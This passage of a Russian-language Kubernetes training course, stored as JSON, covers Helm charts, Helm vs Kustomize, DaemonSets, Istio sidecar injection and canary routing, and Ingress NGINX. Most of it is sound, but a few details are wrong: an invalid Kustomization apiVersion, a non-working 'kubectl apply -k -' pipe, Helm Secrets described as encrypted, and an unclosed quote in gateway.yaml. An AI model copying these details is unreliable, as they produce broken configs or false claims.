        "code": "{{/*\nГенерация уникального полного имени ресурса\n*/}}\n{{- define \"myapp.fullname\" -}}\n{{- if .Values.fullnameOverride }}\n{{- .Values.fullnameOverride | trunc 63 | trimSuffix \"-\" }}\n{{- else }}\n{{- printf \"%s-%s\" .Release.Name .Chart.Name | trunc 63 | trimSuffix \"-\" }}\n{{- end }}\n{{- end }}"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Генерация стандартного шаблона чарта\nhelm create myapp\n\n# Проверка синтаксиса и структуры\nhelm lint ./myapp\n\n# Просмотр сгенерированных манифестов без деплоя в кластер\nhelm template my-release ./myapp\n\n# Установка чарта в кластер Kubernetes\nhelm install my-release ./myapp -n default\n\n# Просмотр установленных релизов\nhelm list -n default\n\n# Удаление релиза\nhelm uninstall my-release -n default"
      }
    ],
    "under_the_hood": "При установке чарта Helm на стороне клиента выполняет рендеринг шаблонов, объединяя `templates/*.yaml` со значениями из `values.yaml` и параметрами командной строки. Затем сгенерированные YAML-манифесты отправляются через Kubernetes API Client в `kube-apiserver`. Helm 3 не имеет серверного компонента (в отличие от Helm 2 с Tiller): метаданные о состоянии релиза и его версиях хранятся прямо в кластере в объектах `Secret` с типом `helm.sh/release.v1` в namespace установки.",
    "pitfalls": "1. Использование невалидных символов в названии релиза: имя релиза становится частью DNS-имени сервиса (`<release>-<service>`), поэтому оно должно соответствовать RFC 1123 (только строчные буквы, цифры и дефисы).\n2. Конфликт имен релизов: в рамках одного namespace имена Helm-релизов обязаны быть уникальными.",
    "bigtech_interview": "**Вопрос с собеседования:** «Куда исчез компонент Tiller в Helm 3 и почему это стало ключевым прорывом в безопасности Kubernetes?»\n**Ответ:** В Helm 2 компонент Tiller работал внутри кластера с правами `cluster-admin` и выполнял деплой от своего имени. Это создавало огромную брешь в безопасности: любой разработчик с доступом к Helm мог обойти RBAC кластера. В Helm 3 Tiller был полностью удален. Теперь Helm — это чисто клиентская CLI-утилита, работающая строго в рамках прав текущего пользователя из его `kubeconfig`, а состояние релизов хранится в зашифрованных Secret'ах."
  },
  {
    "num": 94,
    "title": "Сравнительный анализ: Helm vs Kustomize в современной индустрии",
    "task": "Сравни **Helm vs Kustomize**: Helm — templating (Go templates), package management, releases. Kustomize — patching, no templating, native in kubectl. Покажи, когда что использовать (Helm for packaged apps, Kustomize for own manifests).",
    "theory": "В современной экосистеме Cloud Native и Kubernetes сосуществуют два основных подхода к управлению манифестами:\n1. **Helm (Package Manager & Templating Engine):**\n   - **Сильные стороны:** Мощная параметризация через шаблоны Go/Sprig, управление зависимостями (subcharts), версионирование релизов (`helm rollback`), хуки жизненного цикла (`pre-install`, `post-upgrade`), распространение через OCI/Helm-репозитории.\n   - **Слабые стороны:** Сложность отладки вложенных шаблонов, YAML перестает быть валидным YAML до рендеринга, риск синтаксических ошибок в пробелах (`indent`).\n   - **Ниша применения:** Стороннее ПО с открытым исходным кодом (Prometheus, Ingress-Nginx, Redis, Cert-Manager, Kafka).\n2. **Kustomize (Overlay & Patching Engine):**\n   - **Сильные стороны:** 100% чистый и валидный YAML, встроен в `kubectl` (`kubectl apply -k`), простота понимания диффов в Git, идеален для GitOps.\n   - **Слабые стороны:** Нет параметризации строк «на лету» без создания новых файлов патчей, нет управления версиями релизов и встроенного отката.\n   - **Ниша применения:** Собственные микросервисы компании с окружениями dev/stage/prod.\n3. **Гибридный подход (Best Practice в BigTech):** Упаковка зависимостей через Helm, рендеринг через `helm template`, и последующее наложение корпоративных патчей безопасности через Kustomize.",
    "step_by_step": "1. Создайте сравнительную таблицу архитектурных различий.\n2. Продемонстрируйте сценарий, в котором Helm рендерит стороннее приложение, а Kustomize модифицирует его под требования кластера.\n3. Примените гибридный конвейер: `helm template ... | kubectl apply -k -`.",
    "code_blocks": [
      {
        "filename": "comparison.md",
        "lang": "markdown",
        "code": "| Критерий | Helm | Kustomize |\n| :--- | :--- | :--- |\n| **Подход** | Шаблонизация (Go Templates) | Наложение патчей (Overlays) |\n| **Синтаксис** | Jinja-подобный YAML с `{{ }}` | Чистый валидный YAML |\n| **Установка** | Отдельная CLI-утилита `helm` | Встроен в `kubectl -k` |\n| **История релизов** | Да (хранится в Secret кластера) | Нет (управляется через Git) |\n| **Управление зависимостями** | Встроенное (`Chart.yaml`) | Отсутствует |\n| **Идеальный Use Case** | Third-party софт (Ingress, Postgres) | Собственные микросервисы компании |"
      },
      {
        "filename": "kustomization.yaml",
        "lang": "yaml",
        "code": "# Пример интеграции: Kustomize инфлейтит Helm-чарт и патчит его\napiVersion: kustomize.config.k8s.io/v1\nkind: Kustomization\n\nhelmCharts:\n  - name: ingress-nginx\n    repo: https://kubernetes.github.io/ingress-nginx\n    version: 4.8.3\n    releaseName: my-ingress\n    namespace: ingress-nginx\n\npatches:\n  - target:\n      kind: Deployment\n      name: my-ingress-ingress-nginx-controller\n    patch: |-\n      - op: add\n        path: /spec/template/spec/priorityClassName\n        value: system-cluster-critical"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Рендеринг Helm-чарта и наложение патча безопасности Kustomize в едином пайплайне\nkubectl kustomize --enable-helm . | kubectl apply -f -"
      }
    ],
    "under_the_hood": "При выполнении `kubectl kustomize --enable-helm` Kustomize вызывает бинарник Helm в фоновом режиме для выполнения `helm template`. Полученный поток YAML-документов парсится в структуры данных DOM (Kyaml / kustomize engine). Затем применяются операции RFC 6902 (JSON Patch) или Strategic Merge Patch. На выходе получается единый валидный стрим манифестов, полностью соответствующий стандартам корпоративной безопасности.",
    "pitfalls": "1. Использование Helm для микросервиса с 2-мя манифестами: неоправданно усложняет проект десятком шаблонных файлов `_helpers.tpl` и `templates/` вместо простого `deployment.yaml`.\n2. Попытка эмулировать шаблоны в Kustomize с помощью внешних утилит `envsubst` или `sed`: это ломает идеологию декларативности и GitOps, делая манифесты невоспроизводимыми.",
    "bigtech_interview": "**Вопрос с собеседования:** «Какой инструмент — Helm или Kustomize — вы выберете для организации CI/CD конвейера монорепозитория с 50 Go-микросервисами под управлением ArgoCD?»\n**Ответ:** Для собственных микросервисов в связке с ArgoCD стандартом де-факто является **Kustomize**. Он позволяет хранить базовые манифесты в директории `base/`, а различия между стендами (dev/qa/staging/prod) описывать компактными файлами в `overlays/`. Разработчики видят честный YAML без шаблонов, ArgoCD нативно поддерживает Kustomize без генерации артефактов в репозиториях чартов, а аудит изменений через Git diff предельно прозрачен."
  },
  {
    "num": 95,
    "title": "Инфраструктурные агенты: DaemonSet и мониторинг узлов кластера",
    "task": "Изучите **DaemonSet** для агентов observability (Prometheus node exporter, Fluentd).",
    "theory": "**DaemonSet** гарантирует, что ровно **одна копия Pod запущена на каждом worker-узле** кластера (или на подмножестве узлов, выбранных через `nodeSelector` / `affinity`):\n1. **Типичные сценарии использования:**\n   - Сбор системных метрик узла (CPU, RAM, Disk I/O, Network): **Prometheus Node Exporter**.\n   - Сбор системных и контейнерных логов с узла: **Fluentd**, **Promtail**, **Vector**, **Fluentbit**.\n   - Сетевые плагины CNI: **Calico Node**, **Cilium Agent**.\n   - Мониторинг безопасности и ядра Linux: **Falco**, eBPF-агенты.\n2. **Особенности DaemonSet:**\n   - При добавлении нового узла в кластер (например, при срабатывании Cluster Autoscaler) контроллер DaemonSet автоматически запускает на нем Pod. При удалении узла Pod утилизируется сборщиком мусора.\n   - **Tolerations:** По умолчанию K8s не запускает обычные поды на master/control-plane узлах из-за taints (`node-role.kubernetes.io/control-plane:NoSchedule`). Чтобы агент мониторинга собирал метрики и с мастер-нод, в DaemonSet явно прописывают соответствующие `tolerations`.\n   - **hostNetwork и hostPID:** Системным демонам часто нужен доступ к сетевому стеку (`hostNetwork: true`) или процессам хоста (`hostPID: true`) для сбора полной телеметрии.",
    "step_by_step": "1. Создайте манифест `DaemonSet` для `node-exporter`.\n2. Добавьте `hostNetwork: true` и `hostPID: true` для сбора системных метрик хоста.\n3. Примонтируйте директории `/proc` и `/sys` хоста в контейнер в режиме `readOnly`.\n4. Настройте `tolerations`, чтобы агент запускался в том числе на control-plane узлах.\n5. Примените манифест и проверьте количество созданных подов командой `kubectl get daemonset`.",
    "code_blocks": [
      {
        "filename": "node-exporter-daemonset.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-exporter\n  namespace: kube-system\n  labels:\n    app: node-exporter\nspec:\n  selector:\n    matchLabels:\n      app: node-exporter\n  template:\n    metadata:\n      labels:\n        app: node-exporter\n    spec:\n      hostNetwork: true\n      hostPID: true\n      tolerations:\n        - operator: Exists\n          effect: NoSchedule\n      containers:\n        - name: node-exporter\n          image: prom/node-exporter:v1.7.0\n          args:\n            - \"--path.procfs=/host/proc\"\n            - \"--path.sysfs=/host/sys\"\n            - \"--path.rootfs=/rootfs\"\n          ports:\n            - containerPort: 9100\n              hostPort: 9100\n              name: metrics\n          resources:\n            limits:\n              cpu: 100m\n              memory: 128Mi\n            requests:\n              cpu: 50m\n              memory: 64Mi\n          volumeMounts:\n            - name: proc\n              mountPath: /host/proc\n              readOnly: true\n            - name: sys\n              mountPath: /host/sys\n              readOnly: true\n            - name: rootfs\n              mountPath: /rootfs\n              readOnly: true\n      volumes:\n        - name: proc\n          hostPath:\n            path: /proc\n        - name: sys\n          hostPath:\n            path: /sys\n        - name: rootfs\n          hostPath:\n            path: /"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Применение DaemonSet в namespace kube-system\nkubectl apply -f node-exporter-daemonset.yaml\n\n# Просмотр статуса (DESIRED, CURRENT, READY должны совпадать с числом нод)\nkubectl get ds -n kube-system node-exporter\n\n# Проверка сбора метрик узла через curl на порт 9100\ncurl -s http://localhost:9100/metrics | grep \"node_cpu_seconds_total\" | head -n 5"
      }
    ],
    "under_the_hood": "Начиная с Kubernetes 1.12+, планирование подов DaemonSet выполняется стандартным `kube-scheduler` (ранее этим занимался отдельный `daemonset-controller`). Контроллер создает Pod с предустановленным полем `spec.nodeAffinity` или `spec.nodeName`, привязывая его к конкретному узлу. Планировщик проверяет доступность ресурсов, taints и affinity. Если на ноде недостаточно CPU/RAM под запросы `requests` DaemonSet, Pod переходит в статус `Pending`, сигнализируя администратору о дефиците ресурсов.",
    "pitfalls": "1. Отсутствие лимитов `resources.limits`: если агент мониторинга или сбора логов поймает утечку памяти, он может вызвать OOM-kill жизненно важных системных компонентов хоста. Всегда строго ограничивайте ресурсы для DaemonSet.\n2. Использование `hostPath` без `readOnly: true`: монтирование хостовых путей (`/`, `/var/log`) на запись создает критическую уязвимость, позволяя скомпрометированному контейнеру повредить файловую систему ноды.",
    "bigtech_interview": "**Вопрос с собеседования:** «Почему в DaemonSet для агентов мониторинга (например, Node Exporter) критически важно указывать `hostNetwork: true` и `hostPID: true`?»\n**Ответ:** Контейнер изолирован в собственных Linux Network и PID namespaces. Без `hostNetwork: true` контейнер будет видеть только виртуальный сетевой интерфейс (`veth`), не имея доступа к физическим сетевым картам хоста (`eth0`, `bond0`). Без `hostPID: true` контейнер не сможет видеть процессы операционной системы хоста в директории `/proc` и не сможет агрегировать системную статистику использования CPU по процессам."
  },
  {
    "num": 96,
    "title": "Service Mesh: установка Istio и автоматическая инъекция Envoy Sidecar",
    "task": "Установи **Istio**: `istioctl install`. Enable sidecar injection: `kubectl label namespace default istio-injection=enabled`. Покажи automatic Envoy sidecar injection.",
    "theory": "По мере роста микросервисной сети возникают сложные инфраструктурные задачи: сквозное mTLS-шифрование трафика между подами, канареечные релизы, повторы сбоев (retries), размыкатели цепи (circuit breaker) и распределенная трассировка.\n**Service Mesh (на примере Istio):**\n1. **Архитектура:**\n   - **Data Plane (Плоскость данных):** высокопроизводительные прокси-серверы **Envoy**, внедряемые как sidecar-контейнеры (`istio-proxy`) внутрь каждого Pod приложения. Весь входящий (ingress) и исходящий (egress) трафик пода принудительно заворачивается в Envoy.\n   - **Control Plane (Плоскость управления):** компонент **istiod**, который транслирует декларативные правила Kubernetes в конфигурацию Envoy и рассылает ее через xDS API (gRPC).\n2. **Automatic Sidecar Injection:**\n   - При создании Pod специальный `MutatingAdmissionWebhook` от `istiod` перехватывает манифест.\n   - Если namespace помечен лейблом `istio-injection=enabled`, вебхук автоматически внедряет:\n     1. Init-контейнер `istio-init`: настраивает правила ядра Linux `iptables` для перехвата сетевых пакетов на портах TCP.\n     2. Sidecar-контейнер `istio-proxy` (Envoy).",
    "step_by_step": "1. Скачайте и установите утилиту `istioctl`.\n2. Установите минимальный профиль Istio: `istioctl install --set profile=demo -y`.\n3. Разрешите автоматическую инъекцию sidecar в namespace: `kubectl label namespace default istio-injection=enabled`.\n4. Задеплойте обычный микросервис на Go.\n5. Проверьте через `kubectl get pods`, что в поде запустилось 2 контейнера (`2/2 READY`).",
    "code_blocks": [
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Установка Istio с профилем demo для разработки\nistioctl install --set profile=demo -y\n\n# Проверка готовности компонентов Control Plane в namespace istio-system\nkubectl get pods -n istio-system\n\n# Включение автоматической инъекции sidecar-прокси в namespace default\nkubectl label namespace default istio-injection=enabled --overwrite\n\n# Проверка установленного лейбла\nkubectl get ns default --show-labels"
      },
      {
        "filename": "deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo-service\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: echo-service\n  template:\n    metadata:\n      labels:\n        app: echo-service\n    spec:\n      containers:\n        - name: app\n          image: echo-service:v1.0.0\n          ports:\n            - containerPort: 8080"
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n)\n\nfunc main() {\n\thttp.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\t// Заголовки, добавленные Envoy прокси: x-request-id, x-forwarded-for\n\t\treqID := r.Header.Get(\"X-Request-Id\")\n\t\tfmt.Fprintf(w, \"Hello from behind Istio Envoy Sidecar! Request-ID: %s\\n\", reqID)\n\t})\n\n\tlog.Println(\"Микросервис запущен на :8080\")\n\tif err := http.ListenAndServe(\":8080\", nil); err != nil {\n\t\tlog.Fatalf(\"Ошибка сервера: %v\", err)\n\t}\n}"
      }
    ],
    "under_the_hood": "При старте Pod первым выполняется init-контейнер `istio-init` с привилегиями `NET_ADMIN`. Он выполняет скрипт `iptables -t nat -A PREROUTING -p tcp -j ISTIO_INBOUND`, перенаправляя весь входящий трафик порта приложения на локальный порт 15006, где слушает Envoy. Исходящий трафик перенаправляется на порт 15001 (`ISTIO_OUTPUT`). Envoy перехватывает TCP-пакет, применяет политики TLS/маршрутизации и пересылает запрос в Go-приложение через петлю `localhost:8080`.",
    "pitfalls": "1. Запуск init-контейнеров с зависимостью от внешней сети: если Pod имеет кастомный init-контейнер, делающий HTTP-запрос во внешнюю сеть, он может зависнуть, так как `iptables` уже перенаправляют пакеты в Envoy, но сам контейнер `istio-proxy` еще не запущен.\n2. Дополнительные накладные расходы на ресурсы: каждый Envoy sidecar потребляет от 50 МБ RAM и добавляет ~1.5–3 мс сетевой задержки (RTT) на каждый сетевой хоп.",
    "bigtech_interview": "**Вопрос с собеседования:** «Каким образом Kubernetes понимает, что в Pod нужно добавить второй контейнер `istio-proxy`, если в исходном файле `deployment.yaml` описан только один контейнер?»\n**Ответ:** Это происходит благодаря механизму **Mutating Admission Webhook**. Когда манифест отправляется в `kube-apiserver`, до сохранения объекта в `etcd` API-сервер вызывает зарегистрированный вебхук сервиса `istiod`. Вебхук проверяет наличие лейбла `istio-injection=enabled` у namespace, на лету модифицирует JSON-структуру спецификации Pod (добавляя init-контейнер и контейнер `istio-proxy` с томами сертификатов) и возвращает пропатченный манифест обратно в `kube-apiserver`."
  },
  {
    "num": 97,
    "title": "Маршрутизация внешнего трафика: Ingress Controller и Ingress-ресурсы",
    "task": "Установите ingress-контроллер (nginx) и настройте Ingress-ресурс для маршрутизации внешнего трафика к вашему сервису.",
    "theory": "Объект **Service** типа `LoadBalancer` создает отдельный внешний облачный балансировщик для каждого сервиса, что дорого и неэффективно при десятках микросервисов. **Ingress** предоставляет L7 (HTTP/HTTPS) точку входа в кластер:\n1. **Ingress Controller:** активный демон (обычно NGINX, Traefik, HAProxy или Envoy), который слушает порты 80/443, мониторит объекты Ingress через API кластера и динамически переконфигурирует свои правила проксирования.\n2. **Ingress Resource:** манифест, объявляющий правила маршрутизации:\n   - `rules.host`: доменное имя (виртуальный хост, например `api.company.com`).\n   - `http.paths`: пути URL (path-based routing, например `/users` -> `user-service`, `/orders` -> `order-service`).\n   - `pathType`:\n     - `Exact` — точное совпадение пути URL.\n     - `Prefix` — совпадение по префиксу пути (разделенному слешами `/`).\n3. **Аннотации (Annotations):** специфичные настройки контроллера (`nginx.ingress.kubernetes.io/rewrite-target`, CORS, rate-limiting, SSL redirect).",
    "step_by_step": "1. Установите Ingress NGINX Controller через официальный манифест.\n2. Разверните Go-микросервис и ClusterIP Service для него.\n3. Создайте манифест `ingress.yaml` с правилом для хоста `demo.local` и префикса `/`.\n4. Добавьте запись `127.0.0.1 demo.local` в локальный файл `/etc/hosts`.\n5. Отправьте HTTP-запрос через `curl -i http://demo.local` и проверьте ответ.",
    "code_blocks": [
      {
        "filename": "ingress.yaml",
        "lang": "yaml",
        "code": "apiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: app-ingress\n  namespace: default\n  annotations:\n    nginx.ingress.kubernetes.io/ssl-redirect: \"false\"\n    nginx.ingress.kubernetes.io/proxy-read-timeout: \"60\"\nspec:\n  ingressClassName: nginx\n  rules:\n    - host: demo.local\n      http:\n        paths:\n          - path: /\n            pathType: Prefix\n            backend:\n              service:\n                name: web-service\n                port:\n                  number: 8080"
      },
      {
        "filename": "service.yaml",
        "lang": "yaml",
        "code": "apiVersion: v1\nkind: Service\nmetadata:\n  name: web-service\n  namespace: default\nspec:\n  selector:\n    app: web-app\n  ports:\n    - protocol: TCP\n      port: 8080\n      targetPort: 8080"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Установка Ingress NGINX контроллера\nkubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.8.2/deploy/static/provider/cloud/deploy.yaml\n\n# Ожидание готовности контроллера\nkubectl wait --namespace ingress-nginx \\\n  --for=condition=ready pod \\\n  --selector=app.kubernetes.io/component=controller \\\n  --timeout=90s\n\n# Применение манифеста Ingress\nkubectl apply -f ingress.yaml\n\n# Тестовый запрос к сервису через виртуальный хост\ncurl -H \"Host: demo.local\" http://localhost/"
      }
    ],
    "under_the_hood": "Ingress Controller не использует сетевую цепочку `kube-proxy` и `ClusterIP` напрямую. NGINX Ingress Controller через API-сервер подписывается на события `Endpoints` (или `EndpointSlice`). Когда поды сервиса `web-service` запускаются, контроллер получает их прямые IP-адреса и динамически генерирует upstream-блоки внутри `nginx.conf` (или использует Lua-модуль OpenResty для балансировки без перезагрузки процесса NGINX). Трафик направляется напрямую в Pod, минуя лишний NAT в iptables.",
    "pitfalls": "1. Забытый `ingressClassName: nginx`: в кластерах с несколькими контроллерами (или в K8s 1.19+) отсутствие класса приведет к тому, что ни один контроллер не возьмет Ingress в обработку.\n2. Несоответствие `pathType: Prefix`: путь `/app` с `Prefix` матчит `/app/settings`, но не матчит `/application`. Понимание семантики pathType критично для избежания утечек трафика в неверные сервисы.",
    "bigtech_interview": "**Вопрос с собеседования:** «Почему NGINX Ingress Controller по умолчанию отправляет трафик напрямую на IP-адреса Pod'ов, а не на виртуальный IP-адрес (ClusterIP) сервиса?»\n**Ответ:** Это оптимизация производительности и расширенных возможностей балансировки: 1) Исключается двойная трансляция адресов (DNAT) в `kube-proxy` (iptables/ipvs); 2) NGINX получает возможность использовать сложные алгоритмы балансировки (least_conn, ewma, ip_hash), сохранять постоянные сессии (sticky sessions через cookies) и осуществлять gRPC/WebSocket мультиплексирование на уровне L7."
  },
  {
    "num": 98,
    "title": "Практика Helm: кастомные Values, шаблоны и сборка релизов",
    "task": "Напиши **Helm Chart**: `helm create myapp`. Структура: `Chart.yaml`, `values.yaml`, `templates/`. Параметризуй: `replicaCount`, `image.tag`, `resources`, `ingress.enabled`. Установи: `helm install myapp ./myapp -f values-production.yaml`.",
    "theory": "В реальных проектах один и тот же Helm-чарт используется на десятках стендов (local minikube, dev, staging, prod, dr). Для разделения конфигураций используется принцип **каскадного переопределения values**:\n1. Базовый файл `values.yaml` внутри чарта задает безопасные минимальные значения.\n2. Окружение-специфичные файлы (`values-dev.yaml`, `values-production.yaml`) переопределяют ключевые параметры:\n   - В prod увеличивается `replicaCount: 5`.\n   - Включаются жесткие `resources.requests` и `resources.limits`.\n   - Включается `ingress.enabled: true` с production TLS-сертификатами.\n3. Команда установки: `helm install <release> <chart-path> -f values-production.yaml` осуществляет deep-merge словарей, где приоритет имеет файл, переданный через флаг `-f`.",
    "step_by_step": "1. Создайте структуру чарта `myapp/`.\n2. Настройте файл `values.yaml` с дефолтными значениями для разработки.\n3. Создайте файл `values-production.yaml` с боевыми настройками (5 реплик, Ingress с доменом компании, лимиты памяти 2Gi).\n4. Проверьте слияние конфигураций командой `helm template myapp ./myapp -f values-production.yaml`.\n5. Выполните установку в кластер.",
    "code_blocks": [
      {
        "filename": "values.yaml",
        "lang": "yaml",
        "code": "replicaCount: 1\n\nimage:\n  repository: my-registry.io/backend\n  tag: \"latest\"\n  pullPolicy: IfNotPresent\n\nresources:\n  requests:\n    cpu: 50m\n    memory: 64Mi\n  limits:\n    cpu: 200m\n    memory: 256Mi\n\ningress:\n  enabled: false\n  host: dev.local"
      },
      {
        "filename": "values-production.yaml",
        "lang": "yaml",
        "code": "replicaCount: 5\n\nimage:\n  tag: \"v1.4.2\"\n  pullPolicy: Always\n\nresources:\n  requests:\n    cpu: 500m\n    memory: 512Mi\n  limits:\n    cpu: \"2\"\n    memory: 2Gi\n\ningress:\n  enabled: true\n  host: api.production.company.com"
      },
      {
        "filename": "templates/deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: {{ .Release.Name }}-app\nspec:\n  replicas: {{ .Values.replicaCount }}\n  selector:\n    matchLabels:\n      app: {{ .Release.Name }}\n  template:\n    metadata:\n      labels:\n        app: {{ .Release.Name }}\n    spec:\n      containers:\n        - name: backend\n          image: \"{{ .Values.image.repository }}:{{ .Values.image.tag }}\"\n          imagePullPolicy: {{ .Values.image.pullPolicy }}\n          resources:\n            {{- toYaml .Values.resources | nindent 12 }}"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Проверка сгенерированного продакшен-манифеста\nhelm template myapp ./myapp -f values-production.yaml | grep -E \"replicas:|image:\"\n\n# Установка чарта с продакшен-значениями\nhelm install myapp ./myapp -f values-production.yaml -n production --create-namespace\n\n# Проверка установленного релиза\nhelm status myapp -n production"
      }
    ],
    "under_the_hood": "Когда запускается `helm install -f values-production.yaml`, Helm производит рекурсивное слияние (Merge) древовидных структур данных. Если ключ является скаляром (строка, число, boolean), значение из `-f` перезаписывает значение из дефолтного `values.yaml`. Если ключ является картой (map), поля внутри карты дополняются и мерджатся. Если ключ — список (list), список из `-f` полностью замещает дефолтный список.",
    "pitfalls": "1. Замещение списков при слиянии: если в дефолтном `values.yaml` был список `args: [\"--verbose\", \"--port=80\"]`, а в `values-production.yaml` передан `args: [\"--log-json\"]`, итоговый список НЕ объединится, а полностью перезапишется.\n2. Использование тега `image.tag: latest` в production: нарушает воспроизводимость развертывания и делает откат через `helm rollback` невозможным.",
    "bigtech_interview": "**Вопрос с собеседования:** «В каком порядке Helm производит слияние значений, если одновременно переданы `values.yaml`, два файла через `-f` и флаги `--set`?»\n**Ответ:** Порядок приоритета от наименьшего к наибольшему: 1) `values.yaml` дочернего subchart; 2) `values.yaml` родительского чарта; 3) Файлы, переданные через `-f` (в порядке следования слева направо в строке вызова); 4) Параметры, переданные через `--set` и `--set-string`. Флаг `--set` имеет абсолютный наивысший приоритет."
  },
  {
    "num": 99,
    "title": "Istio Traffic Management: VirtualService, DestinationRule и канареечные релизы",
    "task": "Настрой **Istio Traffic Management**: `VirtualService` для routing (weight-based: 90% v1, 10% v2). `DestinationRule` для subsets (version labels). `Gateway` for external access. Покажи canary deployment with Istio.",
    "theory": "Традиционный канареечный релиз в обычном Kubernetes выполняется запуском новой версии пода в том же Deployment/Service. Но если у вас 10 реплик, минимальный шаг канарейки — $1/10 = 10\\%$. Если реплик 2, шаг — $50\\%$.\n**Управление трафиком в Istio (L7 Routing):**\n1. **Gateway:** настраивает пограничный L7-балансировщик Envoy (`istio-ingressgateway`) для приема входящих HTTP/TCP-соединений.\n2. **VirtualService:** описывает правила маршрутизации трафика:\n   - Weight-based routing: точное разделение трафика в процентах (например, 90% на `v1`, 10% на `v2`), независимо от количества физических реплик подов!\n   - Header-based routing: направление на canary-версию только сотрудников компании по HTTP-заголовку (`cookie: type=canary` или `x-user-role: beta-tester`).\n3. **DestinationRule:** определяет политики, применяемые к трафику ПОСЛЕ завершения маршрутизации:\n   - Подмножества (**subsets**): группировка подов сервиса по лейблам (`version: v1`, `version: v2`).\n   - Политики балансировки (round robin, random, least conn).\n   - Circuit Breaker и connection pools.",
    "step_by_step": "1. Задеплойте два Deployment приложения с лейблами `version: v1` и `version: v2`.\n2. Создайте общий Service `catalog-service`.\n3. Создайте `DestinationRule`, определяющий subsets `v1` и `v2`.\n4. Создайте `VirtualService`, направляющий 90% веса на `v1` и 10% на `v2`.\n5. Создайте Istio `Gateway` и проверьте процентное распределение ответов через цикл запросов `curl`.",
    "code_blocks": [
      {
        "filename": "destination-rule.yaml",
        "lang": "yaml",
        "code": "apiVersion: networking.istio.io/v1alpha3\nkind: DestinationRule\nmetadata:\n  name: catalog-destrule\n  namespace: default\nspec:\n  host: catalog-service\n  subsets:\n    - name: v1\n      labels:\n        version: v1\n    - name: v2\n      labels:\n        version: v2"
      },
      {
        "filename": "virtual-service.yaml",
        "lang": "yaml",
        "code": "apiVersion: networking.istio.io/v1alpha3\nkind: VirtualService\nmetadata:\n  name: catalog-vservice\n  namespace: default\nspec:\n  hosts:\n    - \"catalog.example.com\"\n  gateways:\n    - catalog-gateway\n  http:\n    - route:\n        - destination:\n            host: catalog-service\n            subset: v1\n          weight: 90\n        - destination:\n            host: catalog-service\n            subset: v2\n          weight: 10"
      },
      {
        "filename": "gateway.yaml",
        "lang": "yaml",
        "code": "apiVersion: networking.istio.io/v1alpha3\nkind: Gateway\nmetadata:\n  name: catalog-gateway\n  namespace: default\nspec:\n  selector:\n    istio: ingressgateway\n  servers:\n    - port:\n        number: 80\n        name: http\n        protocol: HTTP\n      hosts:\n        - \"catalog.example.com"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Применение манифестов Istio Traffic Management\nkubectl apply -f gateway.yaml\nkubectl apply -f destination-rule.yaml\nkubectl apply -f virtual-service.yaml\n\n# Тестирование весового распределения (90% v1, 10% v2)\nfor i in {1..20}; do\n  curl -s -H \"Host: catalog.example.com\" http://$INGRESS_IP/ | grep -o \"Version: v[12]\"\ndone"
      }
    ],
    "under_the_hood": "`istiod` транслирует `VirtualService` и `DestinationRule` в конфигурации маршрутов Envoy (RouteConfiguration, VirtualHost, WeightedCluster). Пограничный прокси Envoy парсит HTTP-заголовок `Host`, генерирует псевдослучайное число от 0 до 99 для каждого входящего запроса: если число от 0 до 89, запрос роутится в кластер Envoy `outbound|8080|v1|catalog-service.default.svc.cluster.local`, иначе — в `outbound|8080|v2|catalog-service.default.svc.cluster.local`.",
    "pitfalls": "1. Создание `VirtualService` с subsets до создания `DestinationRule`: приведет к ошибке Envoy `503 Service Unavailable`, так как Envoy не знает, какие поды соответствуют подмножеству `v1` и `v2`.\n2. Сумма весов (`weight`) не равна 100: если сумма меньше или больше 100, `istioctl analyze` выдаст предупреждение, а поведение маршрутизации может стать непредсказуемым.",
    "bigtech_interview": "**Вопрос с собеседования:** «Как с помощью Istio реализовать канареечный релиз без изменения весов для обычных пользователей, тестируя новую версию только на внутренних сотрудниках компании?»\n**Ответ:** В `VirtualService` в секцию `http` первым правилом помещается `match` по заголовку: например, `headers: { \"x-user-group\": { \"exact\": \"qa-testers\" } }` с `destination.subset: v2`. Вторым правилом (fallback) идет маршрут без условий с `destination.subset: v1`. В результате 100% реальных пользователей всегда видят стабильную версию v1, а инженеры QA, передавая специальный заголовок, попадают на канареечную версию v2."
  },
  {
    "num": 100,
    "title": "Продвинутая шаблонизация в Helm: условия, циклы и функции Sprig",
    "task": "Используйте **Go-templates** в Helm для генерации манифестов: `{{ .Values.replicaCount }}`, `{{ include \"myapp.fullname\" . }}`.",
    "theory": "Шаблонизатор Helm базируется на языке `text/template` стандартной библиотеки Go с добавлением библиотеки утилит **Sprig**:\n1. **Управляющие конструкции:**\n   - **Условия (`if / else`):**\n     `{{- if .Values.ingress.enabled }} ... {{- else if .Values.other }} ... {{- end }}`\n     С дефисом `{{-` и `-}}` движок обрезает пробельные символы и переводы строк, предотвращая появление пустых строк в YAML.\n   - **Итерации (`range`):**\n     `{{- range $key, $val := .Values.env }}` — обход словарей и списков.\n2. **Именованные шаблоны (`define` и `include`):**\n   - Директива `{{ include \"template.name\" . }}` предпочтительнее `template`, так как результат `include` можно передавать по конвейеру в другие функции: `{{ include \"my.labels\" . | nindent 4 }}`.\n3. **Функции Sprig:**\n   - `default \"default-val\" .Values.custom`: подстановка дефолтного значения при отсутствии ключа.\n   - `quote`: оборачивание строки в кавычки.\n   - `b64enc`: кодирование строки в Base64 (для секретов).\n   - `required \"Поле .Values.apiKey обязательно!\" .Values.apiKey`: выброс ошибки валидации при сборке, если поле не заполнено.",
